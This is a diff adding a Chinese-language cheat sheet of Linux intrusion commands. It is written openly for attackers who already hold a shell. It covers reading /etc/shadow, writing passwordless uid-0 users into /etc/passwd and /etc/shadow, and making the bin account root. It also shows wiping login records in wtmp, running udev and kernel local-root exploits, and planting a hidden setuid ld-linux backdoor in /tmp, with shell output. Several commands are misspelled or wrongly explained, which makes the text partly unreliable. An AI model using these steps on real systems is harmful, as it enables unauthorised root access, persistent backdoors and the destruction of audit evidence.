@@ -1,0 +1,103 @@
+linux入侵常用命令收集
+
+
+cat /etc/passwd 查看linux用户
+
+cat /etc/shadow 查看用户密码需要root权限
+
+cat /etc/sysconfig/network-scripts/ifcfg-ethn N代表网卡号 查看所在网卡的ip信息
+
+ifconfig 查看本机ip信息
+
+cat /etc/resolv.conf 查看DNS信息
+
+bash -i 在反弹的shell中使用可以直观显示命令
+
+bash prompt: 当你以普通限权用户身份进入的时候，一般你会有一个类似bash$的prompt。当你以
+Root登陆时，你的prompt会变成
+
+bash#。
+系统变量 : 试着echo "$USER / $EUID" 系统应该会告诉你它认为你是什么用户。
+
+echo 1>/proc/sys/net/ipv4/if_forward是不是你写错了,应该是echo 1>/proc/sys/net/ipv4/ip_forward,
+
+vim /proc/sys/net/ipv4/ip_forward 吧,默认是0,也就是内核不进行数据包过滤,改为1 ,让内核对数据包进行filter处理!
+
+netstat -an |grep LISTEN |grep :80 查看端口
+
+service --status-all | grep running
+
+service --status-all | grep http
+查看运行服务
+
+lsb_release -a 查看系统版本
+
+重启ssh服务 ：/usr/sbin/sshd stop
+/
+usr/sbin/sshd start
+ssd_config文件里
+PasswordAuthentication no,
+将其改为
+PasswordAuthentication yes
+远程ssh才可登录
+否则显示Access denied
+
+其中Usepam yes可能用来建立pam方式login，比如从其它linux主机ssh到服务端，如果关闭，则不能打开.
+
+su的菜鸟用法
+先chomod 777 /etc/passwd
+然后修改bin用户的gid和uid为0
+然后passwd设置bin的密码
+然后cp /bin/bash /sbin/nologin
+然后su的时候su - bin就可以到rootshell了。
+这个原理就是当ssh不允许root用ssh终端登陆的时候，我们又不知道root密码，的一种很菜鸟的做法
+还可以这样
+sed -i s/bin:x:1:1/bin:x:0:1/g /etc/passwd
+
+gcc prtcl2.c –o local –static –Wall
+
+echo "nosec:x:0:0::/:/bin/sh" >> /etc/passwd
+echo "nosec::-1:-1:-1:-1:-1:-1:500" >> /etc/shadow
+
+清空last记录 cp /dev/null /var/log/wtmp
+-----
+dd if=/dev/zero of=yourfile bs=10M count=10 建立一个100m的大文件在利用Linux Kernel <= 2.6.17.4 (proc) Local Root Exploit提权的时候要用到的
+
+
+/etc/init.d/ssh start    开22端口
+/etc/ssh/sshd_config SSH服务配置文件
+
+
+//////////////////////////////
+udev提权
+
+换了个udev提权，适用于内核范围为2.6.*。
+
+还是上传文件至服务器shell所在目录，执行命令ls，发现文件已经躺在那里面了，之后赋予exp执行权限。
+
+chmod +x pwnkernel.c
+chmod +x wunderbar_emporium.sh
+chmod +x exploit.c
+
+之后执行溢出./w*
+
+成功溢出，root权限，如下图：
+
+ 2 小时前 上传下载附件 (18.88 KB) 
+
+
+之后就是留下一个后门~ 添加一个root权限用户俺也不介意。。。（useradd -u 0 -o "username"）
+
+依次输入命令
+
+cd /tmp
+sh-3.1# ls /lib/ld-linux*
+/lib/ld-linux.so.2
+sh-3.1# cp /lib/ld-linux.so.2 /tmp/.str1ven
+sh-3.1# ls -l .str1ven
+-rwxr-xr-x 1 root root 121684 07-08 21:13 .str1ven
+sh-3.1# chmod +s .str1ven
+sh-3.1# ls -l .str1ven
+-rwsr-sr-x 1 root root 121684 07-08 21:13 .str1ven
+
+成功建立一个后门，退出root，执行./.str1ven `which whoami`,又成功获取root权限~~  如图：
